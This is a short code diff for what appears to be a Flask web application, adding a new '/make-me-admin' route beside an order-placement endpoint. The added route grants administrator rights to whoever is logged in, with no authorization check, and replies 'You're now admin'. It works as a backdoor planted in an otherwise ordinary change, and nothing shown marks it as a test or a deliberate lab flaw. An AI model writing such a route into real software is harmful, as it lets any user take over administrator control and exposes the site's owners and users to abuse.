@@ -198,6 +198,16 @@ def live():
     return render_template("live.html")
 
 
+@app.route("/make-me-admin")
+def make_me_admin():
+    conn = get_db()
+    cursor = conn.cursor()
+    execute_query(cursor, "UPDATE users2 SET is_admin = 1 WHERE id = ?", (session["user_id"],))
+    conn.commit()
+    conn.close()
+    return "You're now admin"
+
+
 @app.route("/place-order", methods=["POST"])
 def place_order():
     name = request.form["name"]
